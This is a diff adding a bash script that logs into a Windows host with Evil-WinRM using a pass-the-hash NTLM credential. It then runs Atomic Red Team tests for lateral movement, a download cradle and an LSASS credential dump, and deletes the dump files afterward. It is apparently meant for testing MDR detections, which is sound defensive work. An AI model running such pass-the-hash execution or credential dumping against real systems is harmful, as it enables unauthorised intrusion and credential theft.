@@ -1,0 +1,40 @@
+#!/bin/bash
+
+# Usage: ./trigger_atomic_remotely.sh <target_ip> <username> <ntlm_hash>
+# Example: ./trigger_atomic_remotely.sh 192.168.1.100 Administrator ':7b8a6c4b5e4e4d8c8f1a2b3c4d5e6f7g'
+
+IP="$1"
+USER="$2"
+HASH="$3"
+
+if [ $# -ne 3 ]; then
+    echo "Usage: $0 <target_ip> <username> <ntlm_hash>"
+    exit 1
+fi
+
+echo "[*] Connecting to $IP via Evil-WinRM and triggering Atomic Red Team tests..."
+
+evil-winrm -i "$IP" -u "$USER" -H "$HASH" << 'EOF'
+# Load profile to get Atomic Red Team module
+. $PROFILE
+
+Write-Host "[*] Running T1021.006-2 (Invoke-Command lateral movement)..." -ForegroundColor Cyan
+Invoke-AtomicTest T1021.006 -TestNumbers 2 -Confirm:$false
+
+Start-Sleep -Seconds 3
+
+Write-Host "[*] Running T1059.001-3 (Download cradle)..." -ForegroundColor Cyan
+Invoke-AtomicTest T1059.001 -TestNumbers 3 -Confirm:$false
+
+Start-Sleep -Seconds 3
+
+Write-Host "[*] Running T1003.001 (LSASS dump)..." -ForegroundColor Cyan
+Invoke-AtomicTest T1003.001 -TestNumbers 1 -Confirm:$false
+
+Write-Host "[+] All tests completed. Check your MDR console for alerts!" -ForegroundColor Green
+
+# Optional cleanup
+Remove-Item C:\Windows\Temp\*.dmp -ErrorAction SilentlyContinue
+
+exit
+EOF
